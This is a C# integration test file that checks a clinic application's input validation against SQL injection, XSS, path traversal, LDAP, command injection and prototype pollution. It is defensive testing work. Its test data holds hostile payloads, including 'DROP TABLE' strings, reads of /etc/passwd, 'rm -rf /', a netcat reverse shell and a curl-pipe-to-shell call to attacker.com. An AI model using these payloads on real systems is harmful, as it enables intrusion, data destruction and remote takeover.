using System.Net;
using System.Net.Http.Json;
using System.Text;
using FluentAssertions;
using XenonClinic.Tests.Fixtures;
using XenonClinic.Tests.Helpers;
using Xunit;

namespace XenonClinic.Tests.Integration.Security;

/// <summary>
/// Tests for input validation middleware - SQL injection, XSS, path traversal protection
/// </summary>
public class InputValidationTests : IClassFixture<CustomWebApplicationFactory>
{
    private readonly CustomWebApplicationFactory _factory;
    private readonly HttpClient _client;

    public InputValidationTests(CustomWebApplicationFactory factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }

    #region SQL Injection Prevention Tests

    [Theory]
    [InlineData("'; DROP TABLE Users; --")]
    [InlineData("1' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("' UNION SELECT * FROM Users--")]
    [InlineData("1; DELETE FROM patients WHERE 1=1;--")]
    [InlineData("' OR 1=1 --")]
    [InlineData("admin' OR '1'='1'/*")]
    [InlineData("1' AND (SELECT COUNT(*) FROM Users) > 0 --")]
    [InlineData("'; EXEC xp_cmdshell('dir'); --")]
    [InlineData("'; WAITFOR DELAY '0:0:10'--")]
    public async Task SqlInjection_InQueryString_IsBlocked(string payload)
    {
        // Act
        var response = await _client.GetAsync($"/api/patients?search={Uri.EscapeDataString(payload)}");

        // Assert - Should either block (400) or handle safely (not 500)
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError,
            because: "SQL injection attempts should be blocked or handled safely");

        if (response.StatusCode == HttpStatusCode.BadRequest)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().Contain("blocked", "Malicious input should be blocked");
        }
    }

    [Theory]
    [InlineData("firstName", "'; DROP TABLE Users; --")]
    [InlineData("lastName", "' OR '1'='1")]
    [InlineData("email", "admin@test.com'; DELETE FROM Users;--")]
    [InlineData("notes", "' UNION SELECT password FROM Users--")]
    public async Task SqlInjection_InRequestBody_IsBlocked(string field, string payload)
    {
        // Arrange
        var json = $"{{\"{field}\": \"{payload}\"}}";
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    [Fact]
    public async Task SqlInjection_InPathParameter_IsBlocked()
    {
        // Act
        var response = await _client.GetAsync("/api/patients/1; DROP TABLE Users;--");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized);
    }

    [Theory]
    [InlineData("X-Custom-Header", "'; DROP TABLE Users;--")]
    [InlineData("X-Tenant-Id", "1 OR 1=1")]
    public async Task SqlInjection_InHeaders_IsBlocked(string headerName, string payload)
    {
        // Arrange
        _client.DefaultRequestHeaders.Add(headerName, payload);

        // Act
        var response = await _client.GetAsync("/api/patients");

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    #endregion

    #region XSS Prevention Tests

    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert('XSS')>")]
    [InlineData("javascript:alert('XSS')")]
    [InlineData("<svg onload=alert('XSS')>")]
    [InlineData("<body onload=alert('XSS')>")]
    [InlineData("<iframe src='javascript:alert(1)'>")]
    [InlineData("'\"><script>alert(String.fromCharCode(88,83,83))</script>")]
    [InlineData("<img src=\"\" onerror=\"alert('XSS')\">")]
    [InlineData("<div style=\"background:url('javascript:alert(1)')\">")]
    [InlineData("onclick=alert('XSS')")]
    [InlineData("<a href=\"javascript:alert('XSS')\">click</a>")]
    [InlineData("<<script>alert('XSS');//<</script>")]
    [InlineData("<ScRiPt>alert('XSS')</ScRiPt>")]
    public async Task Xss_InQueryString_IsBlocked(string payload)
    {
        // Act
        var response = await _client.GetAsync($"/api/patients?search={Uri.EscapeDataString(payload)}");

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);

        // If response is OK, the output should be sanitized
        if (response.IsSuccessStatusCode)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotContain("<script>", "XSS payloads should be sanitized in output");
        }
    }

    [Theory]
    [InlineData("firstName", "<script>alert('XSS')</script>")]
    [InlineData("lastName", "<img src=x onerror=alert('XSS')>")]
    [InlineData("notes", "<iframe src='javascript:alert(1)'>")]
    public async Task Xss_InRequestBody_IsBlocked(string field, string payload)
    {
        // Arrange
        var escapedPayload = payload.Replace("\"", "\\\"");
        var json = $"{{\"{field}\": \"{escapedPayload}\"}}";
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    [Fact]
    public async Task Xss_StoredXss_IsSanitizedOnOutput()
    {
        // This test verifies that even if XSS payload is stored, it's sanitized on output
        // Arrange
        var payload = "<script>alert('stored-xss')</script>";

        // Act
        var response = await _client.GetAsync("/api/patients");

        // Assert
        if (response.IsSuccessStatusCode)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotContain("<script>alert('stored-xss')</script>");
        }
    }

    #endregion

    #region Path Traversal Prevention Tests

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]
    [InlineData("....//....//....//etc/passwd")]
    [InlineData("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")]
    [InlineData("..%252f..%252f..%252fetc/passwd")]
    [InlineData("/etc/passwd%00.jpg")]
    [InlineData("....\\....\\....\\windows\\win.ini")]
    [InlineData("..%c0%af..%c0%af..%c0%afetc/passwd")]
    [InlineData("..%255c..%255c..%255cwindows/win.ini")]
    public async Task PathTraversal_InQueryString_IsBlocked(string payload)
    {
        // Act
        var response = await _client.GetAsync($"/api/documents?path={Uri.EscapeDataString(payload)}");

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
        response.StatusCode.Should().NotBe(HttpStatusCode.OK,
            because: "Path traversal attempts should not succeed");
    }

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system.ini")]
    public async Task PathTraversal_InPathParameter_IsBlocked(string payload)
    {
        // Act
        var response = await _client.GetAsync($"/api/files/{Uri.EscapeDataString(payload)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task PathTraversal_InRequestBody_IsBlocked()
    {
        // Arrange
        var json = "{\"filePath\": \"../../../etc/passwd\"}";
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/documents/upload", content);

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.OK);
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    #endregion

    #region Command Injection Prevention Tests

    [Theory]
    [InlineData("; cat /etc/passwd")]
    [InlineData("| ls -la")]
    [InlineData("& whoami")]
    [InlineData("`id`")]
    [InlineData("$(cat /etc/passwd)")]
    [InlineData("; rm -rf /")]
    [InlineData("| nc -e /bin/sh attacker.com 4444")]
    [InlineData("&& curl http://attacker.com/malware | sh")]
    public async Task CommandInjection_InQueryString_IsBlocked(string payload)
    {
        // Act
        var response = await _client.GetAsync($"/api/system/execute?cmd={Uri.EscapeDataString(payload)}");

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.OK);
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    #endregion

    #region LDAP Injection Prevention Tests

    [Theory]
    [InlineData("*)(uid=*))(|(uid=*")]
    [InlineData("admin)(&)")]
    [InlineData("*)(objectClass=*)")]
    public async Task LdapInjection_InQueryString_IsBlocked(string payload)
    {
        // Act
        var response = await _client.GetAsync($"/api/users/search?username={Uri.EscapeDataString(payload)}");

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    #endregion

    #region JSON Injection Tests

    [Theory]
    [InlineData("{\"__proto__\": {\"admin\": true}}")]
    [InlineData("{\"constructor\": {\"prototype\": {\"admin\": true}}}")]
    public async Task JsonPrototypePollution_IsBlocked(string payload)
    {
        // Arrange
        var content = new StringContent(payload, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.OK);
    }

    [Fact]
    public async Task JsonWithDeeplyNestedObjects_IsHandled()
    {
        // Arrange - Create deeply nested JSON to test stack overflow protection
        var json = "{";
        for (int i = 0; i < 100; i++)
        {
            json += "\"nested\":{";
        }
        json += "\"value\":1";
        for (int i = 0; i < 100; i++)
        {
            json += "}";
        }
        json += "}";

        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert - Should handle gracefully, not crash
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    #endregion

    #region Content-Type Validation Tests

    [Fact]
    public async Task Request_WithMismatchedContentType_IsRejected()
    {
        // Arrange - Send XML with JSON content-type
        var xmlContent = "<root><firstName>Test</firstName></root>";
        var content = new StringContent(xmlContent, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Request_WithUnsupportedContentType_IsRejected()
    {
        // Arrange
        var content = new StringContent("test data", Encoding.UTF8, "application/x-custom-type");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnsupportedMediaType,
            HttpStatusCode.Unauthorized);
    }

    #endregion

    #region Encoding Attack Tests

    [Theory]
    [InlineData("%00")] // Null byte
    [InlineData("%0d%0a")] // CRLF
    [InlineData("%252e%252e%252f")] // Double URL encoded ../
    [InlineData("%c0%ae%c0%ae%c0%af")] // UTF-8 overlong encoding
    public async Task EncodingAttacks_AreBlocked(string encodedPayload)
    {
        // Act
        var response = await _client.GetAsync($"/api/patients?search={encodedPayload}");

        // Assert
        response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
    }

    #endregion

    #region Request Size Limits Tests

    [Fact]
    public async Task Request_WithExcessivelyLargeBody_IsRejected()
    {
        // Arrange - 10MB of data
        var largeContent = new string('x', 10 * 1024 * 1024);
        var json = $"{{\"data\": \"{largeContent}\"}}";
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await _client.PostAsync("/api/patients", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task Request_WithExcessivelyLongHeader_IsRejected()
    {
        // Arrange
        var longHeaderValue = new string('x', 100000);
        _client.DefaultRequestHeaders.Add("X-Custom-Header", longHeaderValue);

        // Act & Assert
        try
        {
            var response = await _client.GetAsync("/api/patients");
            response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError);
        }
        catch (HttpRequestException)
        {
            // Expected - server may reject before processing
        }
    }

    #endregion
}
